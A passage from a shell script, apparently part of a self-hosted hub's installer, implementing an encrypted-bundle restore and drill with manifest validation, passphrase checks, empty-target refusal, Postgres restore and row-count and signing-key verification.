        sed -n -e "s/^L \\(.*\\) -> .*$/\\1/p" \
               -e "s/^[dfl] [0-7][0-7]* [0-9][0-9]* [0-9][0-9]* //p" \
               -e "s/^[0-9a-f][0-9a-f]*  //p" "$1" | LC_ALL=C sort -u
      }
      paths /tmp/plus > /tmp/plus.p
      paths /tmp/minus > /tmp/minus.p
      comm -12 /tmp/plus.p /tmp/minus.p > /tmp/changed.p
      comm -23 /tmp/plus.p /tmp/minus.p > /tmp/added.p
      comm -13 /tmp/plus.p /tmp/minus.p > /tmp/removed.p
      sed "s/^/added   /" /tmp/added.p > /tmp/report
      sed "s/^/removed /" /tmp/removed.p >> /tmp/report
      sed "s/^/changed /" /tmp/changed.p >> /tmp/report
      head -10 /tmp/report >&2
      printf "%s %s %s %s %s %s\n" \
        "$(grep -c "^[dfl] " /tmp/meta || true)" \
        "$(wc -l < /tmp/h | tr -d " ")" \
        "$(grep -c "^L " /tmp/meta || true)" \
        "$(wc -l < /tmp/added.p | tr -d " ")" \
        "$(wc -l < /tmp/removed.p | tr -d " ")" \
        "$(wc -l < /tmp/changed.p | tr -d " ")"
    ' sh "$key" "$tree" 2> "$BK_RES_STAGE/diff.$key")" || {
      bk_fail "restoring the volume \`$key\` into $vol failed. Checked, in order: the
       decrypted tree is a directory, its listing is a file, the copy exited 0,
       and the listing re-derived from what landed. Nothing here treats any of
       those as an empty volume.
$(sed 's/^/       /' "$BK_RES_STAGE/diff.$key" 2>/dev/null)"
      return 1
    }
  entries="$(printf '%s' "$line" | awk '{print $1}')"
  files="$(printf '%s' "$line" | awk '{print $2}')"
  links="$(printf '%s' "$line" | awk '{print $3}')"
  added="$(printf '%s' "$line" | awk '{print $4}')"
  removed="$(printf '%s' "$line" | awk '{print $5}')"
  changed="$(printf '%s' "$line" | awk '{print $6}')"
  if [ -z "$entries" ] || [ -z "$added" ] || [ -z "$removed" ] || [ -z "$changed" ]; then
    bk_fail "the restore of volume \`$key\` answered '$line', which is not six counts."
    return 1
  fi
  if [ "$added" -ne 0 ] || [ "$removed" -ne 0 ] || [ "$changed" -ne 0 ]; then
    bk_fail "the volume \`$key\` restored into $vol does not match the listing sealed in
       this bundle: $added added, $removed removed, $changed changed. The first ten
       differing paths:
$(sed 's/^/         /' "$BK_RES_STAGE/diff.$key" 2>/dev/null)
       The volume is left in place for inspection and this run stops before
       touching the database."
    return 1
  fi
  printf 'volume %s -> %s: %s entries, %s files, %s links, listing identical\n' \
    "$key" "$vol" "$entries" "$files" "$links"
}

# ── §9.2 step 12: pg_restore, through a container on the server's network ───
#
# The dump never crosses the host: a throwaway container of the postgres image
# mounts the content volume and talks to the server over the network it is on.
# --exit-on-error is not tidiness — pg_restore's default is to continue past
# errors, which turns a misdirected restore into an interleaving instead of a
# stop — and --single-transaction is what makes a non-zero exit mean "the
# database is exactly as it was".
bk_pg_restore_into() {
  local vol="$1" image="$2" net="$3" host="$4" db="$5" owner="$6" member="$7" err
  err="$BK_RES_STAGE/pg_restore.$db.err"
  if ! bk_docker run --rm --user 0:0 --network "$net" -v "$vol:/stage:ro" \
    -e PGPASSFILE=/stage/.pgpass --entrypoint pg_restore "$image" \
    --single-transaction --exit-on-error --no-owner --role="$owner" \
    -h "$host" -U postgres -d "$db" "/stage/open/db/$member" > "$err" 2>&1; then
    bk_fail "pg_restore of $member into $db exited non-zero. It ran
       --single-transaction, so the whole transaction rolled back and $db is
       exactly as it was. Verbatim:
$(sed 's/^/       /' "$err" 2>/dev/null)"
    return 1
  fi
  return 0
}

# ── §9.2 steps 13 and 14: the two measurements that decide the verdict ──────

# Re-measure every table of $3 on server $2 under the manifest's own session
# and compare to the counts TSV at $4. EVERY difference is listed, not the
# first (§9.2 step 13). A count difference is a failure: unlike v3, which
# forgave it because it compared n_live_tup statistics
# (backend/app/backup_restore.py:264-279), both sides here are exact count(*).
bk_compare_census() {
  local pgid="$1" db="$2" want="$3" got diffs n
  got="$BK_RES_STAGE/$db.restored.tsv"
  bk_census "$pgid" "$db" > "$got" || return 1
  diffs="$(awk -F'\t' '
    NR == FNR { w[$1] = $2 "\t" $3; seen[$1] = 1; next }
    { g[$1] = $2 "\t" $3; there[$1] = 1 }
    END {
      for (t in seen) {
        if (!(t in there)) { printf "%s: in the bundle and not in the restore\n", t; continue }
        if (w[t] != g[t]) {
          split(w[t], a, "\t"); split(g[t], b, "\t")
          printf "%s: bundle %s rows / digest %s, restored %s rows / digest %s\n", t, a[1], a[2], b[1], b[2]
        }
      }
      for (t in there) if (!(t in seen)) printf "%s: in the restore and named by no row of the bundle\n", t
    }
  ' "$want" "$got" | LC_ALL=C sort)"
  if [ -n "$diffs" ]; then
    bk_fail "$db does not measure equal to the bundle. Both sides were measured under
       the same six pinned GUCs, so this is the data, not the frame. Every
       difference:
$(printf '%s\n' "$diffs" | sed 's/^/         /')"
    return 1
  fi
  n="$(wc -l < "$want" | tr -d ' ')"
  printf '%s\n' "$n"
}

# encode(sha256(private_key_hex::bytea), 'hex') out of the restored core
# database, against what the manifest recorded. Every paired device pins this
# key (services/core/app/devices_ws.py:288-289), so a restore that lost it
# silently un-pairs every device — which is why this is LOUD and not a
# warning. `null == null` is equality; one side null is a failure.
bk_compare_signing_key() {
  local pgid="$1" db="$2" want="$3" rows got
  rows="$(bk_psql "$pgid" "$db" "SELECT count(*) FROM core_signing_key" 2>/dev/null | tr -dc '0-9')"
  if [ -z "$rows" ]; then
    bk_fail "could not count core_signing_key in the restored $db, so nothing can say
       whether this hub's identity survived. Every paired device pins that key."
    return 1
  fi
  got=""
  if [ "$rows" -eq 1 ]; then
    got="$(bk_psql "$pgid" "$db" "SELECT encode(sha256(private_key_hex::bytea), 'hex') FROM core_signing_key" 2>/dev/null)"
    if [ -z "$got" ]; then
      bk_fail "could not compute the core signing key's digest in the restored $db."
      return 1
    fi
  elif [ "$rows" -gt 1 ]; then
    bk_fail "the restored $db carries $rows core_signing_key rows. There is exactly one
       answer to \"which key is core's\"."
    return 1
  fi
  if [ "$got" != "$want" ]; then
    bk_fail "THE SIGNING KEY DID NOT SURVIVE. The bundle recorded
       ${want:-<no key: this hub had never paired a device>} and the restored $db
       measures ${got:-<no key>}. Every paired device pins this key
       (services/core/app/devices_ws.py:288-289): a hub whose key changed has
       un-paired every device it had."
    return 1
  fi
  if [ -z "$want" ]; then
    printf 'signing key: the bundle carried none and the restore has none — equal\n'
  else
    printf 'signing key: fingerprint equal (%s)\n' "$want"
  fi
  return 0
}

# ── the outer file, checked on the HOST before a container is started ───────
#
# §5.1 forces the outer member order, and the first six members are cleartext,
# so all of this is `tar` on the host: no image, no passphrase, no decrypt.
# Doing it here rather than through `novabundle.py verify --bundle` is
# deliberate — novabundle imports `cryptography` to decrypt, and the image a
# bare restore target actually has is `python:3.12-slim`, which does not carry
# it (that is the whole reason nova_restore.py has a ctypes backend). A check
# that only runs on a machine that has already installed Nova is not a check
# the restore path has.
BK_OUTER_ORDER="README.txt nova_restore.py restore.sh kat.sha256 kat.enc meta.json payload.enc"

# Every top-level key §5.3 documents, in its order. A manifest carrying a key
# this reader does not know is not a manifest it may restore from — §5.3's
# own rule, enforced here because the strict loader lives in a module the
# fallback image cannot import. `the_reader_knows_every_key_the_writer_writes`
# pins this set equal to novabundle.MANIFEST_SPEC's, so the two cannot drift.
BK_MANIFEST_KEYS="format bundle_version created_at mode transport migration_match source postgres session databases volumes binds files env_keys members member_count excluded coverage identity encryption reader_sha256"

bk_outer_members() {
  tar -tf "$1" 2>/dev/null | sed 's|/$||' | sed '/^$/d'
}

bk_outer_member() {
  tar -xOf "$1" "$2" 2>/dev/null
}

# ── the passphrase, which a restore never creates ───────────────────────────
#
# `--passphrase-file` is read here and not through passphrase.sh's `file`
# resolver, because that resolver takes its PATH from deploy/.env
# (np_passphrase_file) and this one comes from the operator's own command
# line. The four checks are the same four, deliberately: a store that exists
# and cannot be read at the mode it should have is not an absent one.
bk_read_passphrase_file() {
  local path="$1" mode value
  if [ ! -f "$path" ]; then
    bk_fail "--passphrase-file $path is not a regular file."
    return 1
  fi
  mode="$(bk_mode_of "$path")"
  if [ -z "$mode" ]; then
    bk_fail "neither \`stat -c\` nor \`stat -f\` could read the mode of $path — refusing
       rather than assuming it is 0600."
    return 1
  fi
  if [ "$mode" != "600" ]; then
    bk_fail "$path is mode $mode, not 600. The passphrase opens every bundle this
       machine has ever written; it is not read from a file other users can read."
    return 1
  fi
  value="$(cat "$path" 2>/dev/null)"
  if [ -z "$value" ]; then
    bk_fail "$path is empty. An empty passphrase is not a passphrase."
    return 1
  fi
  if [ "$(printf '%s' "$value" | wc -l | tr -d ' ')" -gt 0 ]; then
    bk_fail "$path holds more than one line. The passphrase is one line; a file like
       this would be silently cut at the first newline."
    return 1
  fi
  printf '%s' "$value"
}

# ── the verb (design-verdict.md §9.2 and §9.3) ──────────────────────────────
#
# `set -e` is turned OFF for the length of the verb and restored on the way
# out, for exactly cmd_backup's reason (T3's reading 8): deploy/install.sh:8
# is `set -euo pipefail` and it sources this file, and under a live `-e` the
# shell exits at the first `x="$(cmd)"` whose command failed — BEFORE the
# check that would have said why. Every refusal below is a sentence; `-e`
# would replace each of them with a bare status. `-u` and `pipefail` stay on.
cmd_restore() {
  local had_e=0 code=0
  case "$-" in
    *e*) had_e=1; set +e ;;
  esac
  bk_restore_run "$@"
  code=$?
  if [ "$had_e" -eq 1 ]; then
    set -e
  fi
  return "$code"
}

cmd_drill() {
  local had_e=0 code=0
  case "$-" in
    *e*) had_e=1; set +e ;;
  esac
  bk_drill_run "$@"
  code=$?
  if [ "$had_e" -eq 1 ]; then
    set -e
  fi
  return "$code"
}

bk_restore_run() {
  local bundle="" pwfile="" drill=0 D=""
  local stage facts project pw pw_source rc line key full disp
  local crypto_img pg_tag manifest marker body
  local names want got n
  local db owner dump_m counts_m migr_m tbl
  local tables_total dbs_total vols_total
  local net pghost pgid scratch subnet inuse routes
  local created_at src_host src_sha src_project mode_in
  local need_major have_ver have_major srv_want srv_num_want
  local carried plan_write plan_same plan_replace k v cur
  local vol_full vol_key vol_tree sign_want sign_db
  local unhealthy migr_file svc dir found sha f
  local bundle_sha bundle_dir bundle_base

  while [ $# -gt 0 ]; do
    case "$1" in
      --drill) drill=1 ;;
      --passphrase-file) shift; pwfile="${1:-}" ;;
      --passphrase-file=*) pwfile="${1#--passphrase-file=}" ;;
      -h | --help)
        printf './install restore <bundle> [--drill] [--passphrase-file FILE]\n'
        return 0
        ;;
      -*)
        bk_fail "restore: unknown option '$1'. Usage:
       ./install restore <bundle> [--drill] [--passphrase-file FILE]"
        return 2
        ;;
      *)
        if [ -n "$bundle" ]; then
          bk_fail "restore: one bundle at a time; got '$bundle' and '$1'."
          return 2
        fi
        bundle="$1"
        ;;
    esac
    shift
  done
  if [ -z "$bundle" ]; then
    bk_fail "restore: name the bundle. Usage:
       ./install restore <bundle> [--drill] [--passphrase-file FILE]"
    return 2
  fi
  if [ ! -f "$bundle" ]; then
    bk_fail "restore: no such bundle: $bundle"
    return 2
  fi
  bundle_dir="$(cd "$(dirname "$bundle")" && pwd)" || return 1
  bundle_base="$(basename "$bundle")"
  bundle="$bundle_dir/$bundle_base"

  BK_RES_CLEANED=0
  BK_RES_STAGE=""
  BK_RES_VOL=""
  BK_RES_DRILL_VOLS=""
  BK_RES_DRILL_NET=""
  BK_RES_DRILL_CT=""
  BK_RES_DRILL_DBS=""
  BK_RES_DRILL_PGID=""
  trap 'bk_restore_cleanup; exit 1' INT TERM
  trap 'bk_restore_cleanup' EXIT

  # ── 1. a moved host, and a restore that did not finish ───────────────────
  if [ -e "$(bk_moved_marker)" ] && [ "$drill" -eq 0 ]; then
    bk_fail "this host was parked by a \`backup --move\`:

$(sed 's/^/       /' "$(bk_moved_marker)" 2>/dev/null)

       Nova is meant to be running somewhere else. If it is not, run
       \`./install undo-move\` here first."
    return 1
  fi

  stage="$(mktemp -d "${TMPDIR:-/tmp}/nova-restore-stage.XXXXXX")" || return 1
  chmod 700 "$stage"
  BK_RES_STAGE="$stage"
  facts="$stage/facts"
  mkdir -p "$facts"

  if [ "$drill" -eq 1 ]; then
    D="$(bk_hex8)" || return 1
    printf 'drill %s: nothing below touches a live volume, a live database, a live\n' "$D"
    printf '         container or deploy/.env.\n'
  else
    # ── 2. deploy/.env, from the example, BEFORE anything writes a key ─────
    #
    # port-v3 M2 / python-tool M3: set_env_value reads $ENV_FILE to rewrite
    # it, and on a bare restore target that file does not exist. cmd_install
    # never hits it because generate_secrets copies the example first; restore
    # has no equivalent, so this is it.
    if [ ! -f "$(bk_env_file)" ]; then
      if [ ! -f "$(bk_env_example)" ]; then
        bk_fail "neither $(bk_env_file) nor $(bk_env_example) is here, so this restore has
       nothing to write the carried keys into."
        return 1
      fi
      (
        umask 077
        cp "$(bk_env_example)" "$(bk_env_file)"
      ) || {
        bk_fail "could not create $(bk_env_file) from $(bk_env_example)."
        return 1
      }
      chmod 600 "$(bk_env_file)" 2>/dev/null
      line="$(bk_mode_of "$(bk_env_file)")"
      if [ "$line" != "600" ]; then
        bk_fail "$(bk_env_file) was created from the example and reads back mode
       ${line:-unreadable}, not 600. It is about to hold every secret this hub has."
        return 1
      fi
      printf 'env: %s created from the example, mode read back 600\n' "$(bk_env_file)"
    else
      printf 'env: %s is already here\n' "$(bk_env_file)"
    fi

    # ── 3. decide_subnet FIRST ────────────────────────────────────────────
    #
    # Before anything creates a docker object, because a restore that creates
    # six volumes and THEN discovers the subnet is taken has already done work
    # it cannot undo. It writes the five keys and reads every one back.
    if ! command -v decide_subnet >/dev/null 2>&1; then
      bk_fail "decide_subnet is not defined. deploy/subnet.sh is sourced by
       deploy/install.sh; restore cannot pick this machine's addressing without it."
      return 1
    fi
    decide_subnet || return 1
  fi

  # The render: this checkout's own compose, every profile. It is the source
  # of the declared volume set, of each volume's FULL NAME on THIS machine,
  # of the project label and of the postgres image tag — none of which is ever
  # taken out of the bundle.
  bk_set_compose_args
  render_dispositions "$stage" || return 1
  bk_set_project "$stage" || return 1
  project="$(bk_project)" || return 1
  pg_tag="$(bk_render_pg_tag "$facts")" || return 1
  bk_ensure_image "$pg_tag" || return 1
  crypto_img="$(bk_crypto_image)" || return 1
  printf 'images: postgres %s, decryptor %s (both resolved on this host, never from\n' \
    "$pg_tag" "$crypto_img"
  printf '        the bundle)\n'

  # ── 4. open the bundle: the outer shape, then the KAT ────────────────────
  names="$(bk_outer_members "$bundle" | tr '\n' ' ')"
  want="$(printf '%s ' $BK_OUTER_ORDER)"
  if [ "$names" != "$want" ]; then
    bk_fail "$bundle_base is not a Nova bundle: its members are [${names% }] and §5.1
       forces [${want% }], in that order."
    return 1
  fi
  line="$(bk_outer_member "$bundle" meta.json)"
  if [ -z "$line" ]; then
    bk_fail "$bundle_base carries no readable meta.json."
    return 1
  fi
  printf '%s\n' "$line" > "$stage/meta.json"
  n="$(bk_json_field outer_version < "$stage/meta.json")" || n=""
  if [ "$n" != "1" ]; then
    bk_fail "$bundle_base records outer_version '${n:-none}', and this tool knows 1."
    return 1
  fi
  n="$(bk_json_field bundle_version < "$stage/meta.json")" || n=""
  if [ "$n" = "1" ]; then
    bk_fail "$bundle_base is a bundle_version 1 bundle — that is v3's shape, and this
       tool reads version 2. It is refused by name rather than half-read."
    return 1
  fi

  if [ -n "$pwfile" ]; then
    pw="$(bk_read_passphrase_file "$pwfile")" || return 1
    pw_source="--passphrase-file $pwfile"
  else
    pw_source="$(nova_passphrase_source)"
    rc=0
    pw="$(resolve_passphrase)" || rc=$?
    if [ "$rc" -eq 3 ]; then
      bk_fail "there is no passphrase here, and a restore never generates one: the
       bundle is already sealed with the one that wrote it. The resolver
       '$pw_source' reported ABSENT.
       meta.json records passphrase fingerprint $(bk_json_field passphrase_fingerprint < "$stage/meta.json" 2>/dev/null) (cleartext,
       unauthenticated — advisory only)."
      return 1
    fi
    if [ "$rc" -ne 0 ] || [ -z "$pw" ]; then
      bk_fail "no passphrase, no restore. The resolver '$pw_source' exited $rc."
      return 1
    fi
  fi

  # The known-answer test, against 64 known bytes under their own fresh salt,
  # BEFORE a payload byte is read. On a many-GB bundle read off a removable
  # drive a wrong passphrase must cost one scrypt and nothing else — and the
  # refusal names the fingerprint meta.json recorded, so a rotation is STATED
  # when it is known and never guessed. The same run hands back the sealed
  # MANIFEST.json; see bk_read_manifest for why that is not free.
  manifest="$stage/MANIFEST.json"
  rc=0
  printf '%s\n' "$pw" | bk_read_manifest "$bundle_dir" "$bundle_base" "$crypto_img" \
    > "$manifest" 2> "$stage/kat.out" || rc=$?
  if [ "$rc" -eq 1 ]; then
    bk_fail "the passphrase does not open $bundle_base. Nothing was read past the
       known-answer test.
$(sed 's/^/       /' "$stage/kat.out" 2>/dev/null)"
    return 1
  fi
  if [ "$rc" -ne 0 ]; then
    bk_fail "$bundle_base opened and what came out of it is not a bundle this tool can
       read:
$(sed 's/^/       /' "$stage/kat.out" 2>/dev/null)"
    return 1
  fi
  if [ ! -s "$manifest" ]; then
    bk_fail "$bundle_base was opened and produced no MANIFEST.json."
    return 1
  fi
  chmod 600 "$manifest" 2>/dev/null
  printf 'passphrase: %s — the known-answer test passed before a payload byte was read\n' \
    "$pw_source"

  # ── 5a. what the manifest says about itself ──────────────────────────────
  #
  # Every one of these runs BEFORE anything is created and before the payload
  # is extracted, so a bundle that disagrees with itself costs one decrypt
  # and no docker object at all.
  # §5.3: a documented key that is absent, or a key this reader does not know,
  # is an error — a manifest this code does not fully understand is not a
  # manifest it may restore from.
  # [A-Za-z_0-9], because `reader_sha256` carries digits and a class without
  # them reported the last documented key as absent on every real bundle.
  got="$(sed -n 's/^  "\([A-Za-z_0-9]*\)": .*$/\1/p' "$manifest" | tr '\n' ' ')"
  for k in $BK_MANIFEST_KEYS; do
    case " $got " in
      *" $k "*) ;;
      *)
        bk_fail "the manifest inside $bundle_base has no \`$k\`, which §5.3 documents. A
       manifest this reader does not fully understand is not one it restores from."
        return 1
        ;;
    esac
  done
  for k in $got; do
    case " $BK_MANIFEST_KEYS " in
      *" $k "*) ;;
      *)
        bk_fail "the manifest inside $bundle_base carries \`$k\`, which this reader does
       not know. A manifest written by a newer Nova is refused, not half-read."
        return 1
        ;;
    esac
  done

  # Every field meta.json duplicates, re-read from the AUTHENTICATED manifest
  # and compared. meta.json is cleartext and unauthenticated; a disagreement
  # is a refusal (§5.4).
  for line in "format:format" "bundle_version:bundle_version" \
    "created_at:created_at" "mode:mode" "transport:transport" \
    "member_count:member_count" "reader_sha256:reader_sha256"; do
    k="${line%%:*}"
    v="${line#*:}"
    want="$(bk_json_field "$k" < "$stage/meta.json" 2>/dev/null)" || want=""
    got="$(bk_m_top "$v" < "$manifest")" || got=""
    if [ "$want" != "$got" ]; then
      bk_fail "$bundle_base disagrees with itself: its cleartext meta.json says
       $k='$want' and the manifest sealed inside says $v='$got'."
      return 1
    fi
  done
  want="$(bk_json_field source_host < "$stage/meta.json" 2>/dev/null)" || want=""
  got="$(bk_m_sub source host < "$manifest")" || got=""
  if [ "$want" != "$got" ]; then
    bk_fail "$bundle_base disagrees with itself: meta.json says source_host='$want' and
       the sealed manifest says source.host='$got'."
    return 1
  fi
  # The reader that ships in the bundle is the one manifest.reader_sha256
  # names — checked here, on the host, with no decrypt at all.
  want="$(bk_m_top reader_sha256 < "$manifest")" || want=""
  got="$(bk_outer_member "$bundle" nova_restore.py | { sha256sum 2>/dev/null || shasum -a 256; } | cut -d' ' -f1)"
  if [ -z "$got" ] || [ "$want" != "$got" ]; then
    bk_fail "the nova_restore.py inside $bundle_base hashes to '${got:-nothing}' and the
       sealed manifest names '$want'."
    return 1
  fi

  created_at="$(bk_m_top created_at < "$manifest")" || created_at=""
  mode_in="$(bk_m_top mode < "$manifest")" || mode_in=""
  src_host="$(bk_m_sub source host < "$manifest")" || src_host=""
  src_sha="$(bk_m_sub source repo_sha < "$manifest")" || src_sha=""
  src_project="$(bk_m_sub source project < "$manifest")" || src_project=""
  printf 'bundle: %s, a %s backup written %s on %s (project %s, commit %s)\n' \
    "$bundle_base" "$mode_in" "$created_at" "$src_host" "$src_project" \
    "${src_sha:-unrecorded}"

  # §5.3: restore re-measures under the manifest's OWN session, so a key it
  # does not know is a refusal. A digest measured under a frame this tool
  # cannot reproduce is not comparable to one it re-measures.
  got="$(bk_m_sub_keys session < "$manifest" | LC_ALL=C sort | tr '\n' ' ')"
  want="$(printf '%s' "$BK_SESSION_SQL" | tr ';' '\n' |
    sed -n 's/^ *SET LOCAL \([A-Za-z_]*\)=.*/\1/p' | LC_ALL=C sort | tr '\n' ' ')"
  if [ "$got" != "$want" ]; then
    bk_fail "this bundle's digests were measured under the session [${got% }] and this
       tool measures under [${want% }]. A digest measured under a frame this
       restore cannot reproduce is not one it can compare."
    return 1
  fi
  printf 'session: the six pinned GUCs in this bundle are the six this tool measures under\n'

  # ── 6. refuse a non-empty target ─────────────────────────────────────────
  #
  # THE SINGLE MOST IMPORTANT LINE IN THE VERB, and the reason this design
  # needs no pre-restore snapshot and no database swap: a bad restore cannot
  # be rolled back in place, so a restore only ever runs where there is
  # nothing to roll back to.
  #
  # Over the DECLARED set and not over manifest.volumes (port-v3 M1,
  # shell-first M3): v4_pgdata is `dump-pg`, so it has no manifest.volumes row
  # at all, and a loop over the manifest never inspects the single most
  # important non-empty target on the machine. The sequence that hides behind
  # that omission: the target ran ./install once and was `compose down`-ed, so
  # its PGDATA holds the TARGET's password; restore writes the carried .env
  # with the SOURCE's; postgres-init does not re-run on a non-empty PGDATA;
  # pg_restore succeeds over the local socket as superuser; every census
  # matches; and then core, gateway and memory all fail to authenticate over
  # TCP. The restore verified counts and digests and still produced a hub that
  # cannot open its own database.
  #
  # The declared set is read from THIS checkout's render — never from the
  # bundle, and never assembled as <project>_<key>. A volume the render prunes
  # is one `docker compose up` will not create or adopt here either, so it is
  # not a target this restore can write into.
  if [ "$drill" -eq 0 ]; then
    got=""
    for key in $(cfg_volume_keys < "$facts/config.yaml"); do
      full="$(cfg_volume_name "$key" < "$facts/config.yaml")"
      disp="$(cfg_volume_disposition "$key" < "$facts/config.yaml" | cut -f1)"
      if [ -z "$full" ]; then
        bk_fail "this checkout's render declares the volume \`$key\` and gives it no
       \`name:\`, so nothing here knows what docker would call it."
        return 1
      fi
      if [ -z "$disp" ]; then
        bk_fail "this checkout's render declares the volume \`$key\` with no
       x-nova-backup disposition, so nothing here can say whether a restore
       writes into it."
        return 1
      fi
      case "$disp" in
        include | move-only | dump-pg) ;;
        *) continue ;;
      esac
      rc=0
      bk_volume_state "$full" "$pg_tag" || rc=$?
      case "$rc" in
        0) ;;
        1) got="$got
       volume $full ($key, $disp) exists and is not empty" ;;
        *) got="$got
       volume $full ($key, $disp) exists and could not be read — \"could not
       determine\" is a refusal here, not a pass" ;;
      esac
    done
    line="$(bk_docker ps -a --filter "label=com.docker.compose.project=$project" \
      --format '{{.Names}}' 2>/dev/null | sed '/^$/d' | tr '\n' ' ')"
    if [ -n "$line" ]; then
      got="$got
       container(s) of the project \`$project\` are here, exited ones included:
       ${line% }"
    fi
    if [ -n "$got" ]; then
      bk_fail "this is not an empty target, and a restore never writes over a live
       one:$got

       A bad restore CANNOT be rolled back in place, which is why this refuses
       instead of merging. Tear the old stack down first:
         docker compose --project-directory $BK_DIR down -v$(
        if [ -f "$(bk_restore_marker)" ]; then
          printf '\n\n       A previous restore did not finish. It recorded exactly what it created:\n'
          sed 's/^/         /' "$(bk_restore_marker)"
          printf '\n       Nothing here discovers anything: that list is the bound. To clear it,\n'
          printf '       remove those objects and then delete %s.' "$(bk_restore_marker)"
        fi
      )"
      return 1
    fi
    printf 'target: every declared volume this restore fills is absent or empty, and no\n'
    printf '        container of the project `%s` is here\n' "$project"
  fi

  # ── 5b. decrypt, extract, re-derive every member's sha256 ────────────────
  #
  # Into a throwaway docker volume the HOST NEVER MOUNTS, for cmd_backup's
  # reason: the dumps hold the signing key and every provider API key.
  # nova_restore.py --out does the whole of §9.2 step 5 — safe_extract refuses
  # an absolute member, a `..` member, a hardlink, a device node and an
  # ESCAPING symlink (s41/rulings.md A), then re-derives every member's
  # sha256 from the extracted bytes and compares.
  #
  # AFTER step 6, which the verdict puts after this. The order between them
  # is not load-bearing and the cost is: a target that is going to be refused
  # is refused before a multi-gigabyte payload is decrypted and written, not
  # after. Every check either side still runs, in the same relation to what
  # it guards.
  if [ "$drill" -eq 1 ]; then
    BK_RES_VOL="nova-drill-${D}_content"
    bk_drill_volume_create "$BK_RES_VOL" || return 1
  else
    BK_RES_VOL="nova-restore-content-$(bk_stamp)-$$"
    if ! bk_docker volume create "$BK_RES_VOL" >/dev/null 2>&1; then
      bk_fail "could not create the decrypted-content volume $BK_RES_VOL."
      return 1
    fi
  fi
  if ! printf '%s\n' "$pw" | bk_nova -v "$bundle_dir:/bundle:ro" -v "$BK_RES_VOL:/stage" \
    "$crypto_img" python3 /novabundle/nova_restore.py "/bundle/$bundle_base" \
    --out /stage/open > "$stage/open.out" 2>&1; then
    # No next steps at all: a failed verify must never read as a partial
    # success (§9.2 step 5).
    bk_fail "$bundle_base does not verify, so nothing was restored from it:
$(sed 's/^/       /' "$stage/open.out" 2>/dev/null)"
    return 1
  fi
  printf 'bundle: every member re-hashed from the decrypted bytes and matched\n'

  # ── 7. the version gate, and the migration gate ──────────────────────────
  #
  # `postgres:16` pins the MAJOR only (measurements.md R1), so the exact
  # server version travels in the manifest and the comparison belongs HERE.
  # The same $PG_IMAGE answers the gate and runs the server, so this cannot
  # check a version it will not use (port-v3 m9).
  need_major="$(bk_m_sub postgres pg_dump_major < "$manifest")" || need_major=""
  srv_want="$(bk_m_sub postgres server_version < "$manifest")" || srv_want=""
  srv_num_want="$(bk_m_sub postgres server_version_num < "$manifest")" || srv_num_want=""
  if [ -z "$need_major" ]; then
    bk_fail "the manifest records no postgres.pg_dump_major, so nothing here can say
       whether this host's pg_restore can read its dumps."
    return 1
  fi
  have_ver="$(bk_pg_run --network none --entrypoint pg_restore "$pg_tag" --version 2>/dev/null | awk '{print $NF}')"
  have_major="${have_ver%%.*}"
  case "$have_major" in
    "" | *[!0-9]*)
      bk_fail "\`pg_restore --version\` in $pg_tag answered '${have_ver:-nothing}', so this
       host's major version is unreadable. A dump restored by a pg_restore nobody
       could identify is a restore nobody can promise."
      return 1
      ;;
  esac
  if [ "$have_major" -lt "$need_major" ]; then
    bk_fail "this bundle was written by pg_dump major $need_major and this host's
       $pg_tag carries pg_restore $have_ver (major $have_major). A lower major cannot
       read a higher major's custom-format dump."
    return 1
  fi
  printf 'postgres: the bundle was written by server %s (%s) / pg_dump major %s; this\n' \
    "$srv_want" "$srv_num_want" "$need_major"
  printf '          host has %s with pg_restore %s (major %s)\n' "$pg_tag" "$have_ver" "$have_major"

  # Every applied migration must exist in THIS checkout — matched by CONTENT,
  # which is what makes a renumbered migration match and a genuinely different
  # one refuse (shell-first M12). There is no override flag: an override that
  # proceeds is a fallback that reads as success.
  dbs_total=0
  while IFS=$'\037' read -r db owner dump_m counts_m migr_m tbl; do
    [ -n "$db" ] || continue
    dbs_total=$((dbs_total + 1))
    if ! bk_is_sql_name "$db" || ! bk_is_sql_name "$owner"; then
      bk_fail "the manifest names a database '$db' owned by '$owner'. A name this shell
       is about to put in SQL and in argv is [A-Za-z_][A-Za-z0-9_]* and nothing
       else."
      return 1
    fi
    # Every member this verb reads is built from the database NAME it has just
    # shape-checked, and the manifest's own field has to agree with it. A path
    # out of the bundle is never joined onto anything here: that is the class
    # that has bitten this file three times (s41/rulings.md).
    if [ "$dump_m" != "db/$db.dump" ] ||
      [ "$counts_m" != "db/$db.counts.tsv" ] ||
      [ "$migr_m" != "db/$db.migrations.tsv" ]; then
      bk_fail "the manifest gives $db the members '$dump_m', '$counts_m' and '$migr_m',
       and a Nova bundle names them db/$db.dump, db/$db.counts.tsv and
       db/$db.migrations.tsv. Nothing here reads a path the bundle chose."
      return 1
    fi
    svc="${db#nova_}"
    dir="$BK_REPO_ROOT/services/$svc/migrations"
    migr_file="$stage/$db.migrations.tsv"
    bk_stage_get "$BK_RES_VOL" "$crypto_img" "open/db/$db.migrations.tsv" > "$migr_file" || {
      bk_fail "could not read db/$db.migrations.tsv out of the opened bundle."
      return 1
    }
    if [ ! -s "$migr_file" ]; then
      bk_fail "db/$db.migrations.tsv is empty in this bundle, so nothing can say which
       migrations produced the rows it carries."
      return 1
    fi
    if [ ! -d "$dir" ]; then
      bk_fail "$db records applied migrations and $dir is not in this checkout. This
       bundle is from a Nova this checkout does not have; check out
       $(printf '%s' "${src_sha:-the recorded commit}" | cut -c1-7) and restore there."
      return 1
    fi
    while IFS=$'\t' read -r f sha; do
      [ -n "$f" ] || continue
      found=""
      for v in "$dir"/*; do
        [ -f "$v" ] || continue
        n="$(sha256_of "$v")" || return 1
        if [ "$n" = "$sha" ]; then
          found="$(basename "$v")"
          break
        fi
      done
      if [ -z "$found" ]; then
        bk_fail "$db was migrated by '$f' and no file in services/$svc/migrations has
       that content. This bundle is from a Nova this checkout does not have; check
       out $(printf '%s' "${src_sha:-the recorded commit}" | cut -c1-7) and restore
       there. The match is by CONTENT, so a RENUMBERED migration matches — this
       one does not."
        return 1
      fi
    done < "$migr_file"
    printf 'migrations %s: %s applied, every one found by content in %s\n' \
      "$db" "$(wc -l < "$migr_file" | tr -d ' ')" "services/$svc/migrations"
  done <<EOF
$(bk_m_rows databases "name,owner,dump_member,counts_member,migrations_member,tables" < "$manifest")
EOF
  if [ "$dbs_total" -eq 0 ]; then
    bk_fail "this bundle carries no database. Nova's state is three of them, so none is
       a bundle this tool restores from."
    return 1
  fi

  # ── 8. the carried .env keys — a plan, then an apply, then a re-read ─────
  #
